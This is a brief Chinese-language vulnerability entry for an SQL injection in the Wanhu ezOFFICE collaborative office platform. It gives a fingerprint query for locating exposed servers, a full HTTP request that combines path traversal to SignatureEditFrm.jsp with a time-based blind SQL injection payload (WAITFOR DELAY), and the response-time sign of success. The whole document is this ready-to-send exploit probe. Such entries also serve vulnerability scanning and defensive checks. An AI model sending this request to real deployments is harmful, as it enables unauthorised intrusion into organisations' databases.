# 万户ezoffice协同办公平台SignatureEditFrm存在SQL注入漏洞

万户ezoffice协同办公平台 ｜ SQL注入 ｜ —
- **指纹**：`app="万户ezOFFICE协同管理平台"`
- **请求**：`GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s